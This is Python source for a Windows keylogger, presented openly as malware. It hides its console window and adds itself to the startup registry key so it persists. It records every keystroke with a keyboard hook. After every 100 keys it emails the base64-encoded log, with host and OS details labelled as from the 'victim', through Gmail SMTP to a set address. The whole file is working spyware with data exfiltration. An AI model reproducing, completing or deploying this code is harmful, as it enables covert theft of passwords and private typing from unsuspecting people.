import win32api
import win32console
import win32gui
import pythoncom,pyHook
import smtplib
import base64, os, sys, re, string
import sqlite3
import socket
import platform
import uuid
from _winreg import *
def addStartup():  # this will add the file to the startup registry key
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split('\\')[-1]
    new_file_path = fp + '\\' + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, 'Im not a keylogger', 0, REG_SZ,
               new_file_path)
addStartup()
## CHANGE THIS ##
sender = 'your_email@gmail.com'
reciever = 'your_email@gmail.com'
password = 'your_password'
# Dont change this
marker = "AUNIQUEMARKER"
win=win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)
#create text file
with open('output.txt','w+') as f:
    print ""
f.close
print "Running..."
points = 0
def OnKeyboardEvent(event):
    #Ctrl-E
    global points
    points += 1
    print points
    if event.Ascii==5:
        f=open('output.txt','r+')
        f.close()
        os.remove("output.txt")
        sys.exit(0)
    if event.Ascii !=0 or 8:
        f=open('output.txt','r+')
        buffer=f.read()
        f.close()
        f=open('output.txt','w+')
        keylogs=chr(event.Ascii)
        #if press ENTER 
        if event.Ascii==13:
            keylogs='\n'  
        if event.Ascii==32:
            keylogs=' '
        buffer+=keylogs
        f.write(buffer)
        f.close()
    if points == 100: ## how may letters typed
        points = 0
        filename = "output.txt"
        fo = open(filename, "rb")
        filecontent = fo.read()
        encodedcontent = base64.b64encode(filecontent)

        body = """
New stuff info from victim
===========================
Name: %s
FQDN: %s
System Platform: %s
Machine: %s
Node: %s
Platform: %s
Processor: %s
System OS: %s
Release: %s
Version: %s
        """ % (socket.gethostname(), socket.getfqdn(), sys.platform,platform.machine(),platform.node(),platform.platform(),platform.processor(),platform.system(),platform.release(),platform.version()) ###########
        part1 = """From: Victim <toxicnull@gmail.com>
To: Filip <toxicnull@gmail.com>
Subject: New Info From Keylogger
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary=%s
--%s
        """ % (marker, marker)

        part2 = """Content-Type: text/plain
Content-Transfer-Encoding:8bit
%s
--%s
        """ % (body,marker)

        part3 = """Content-Type: multipart/mixed; name=\"%s\"
Content-Transfer-Encoding:base64
Content-Disposition: attachment; filename=%s
%s
--%s--
        """ %(filename, filename, encodedcontent, marker)

        message = part1 + part2 + part3

        try:
           fo.close()
           f.close()
           smtpObj = smtplib.SMTP('smtp.gmail.com:587')
           smtpObj.starttls()
           smtpObj.login(sender, password)
           smtpObj.sendmail(sender, reciever, message)
           print "Success"
           os.remove("output.txt")
           f = open('output.txt','w+')
           f.close()
        except Exception as e:
           print "Error: "
           print e

hm=pyHook.HookManager()
hm.KeyDown=OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
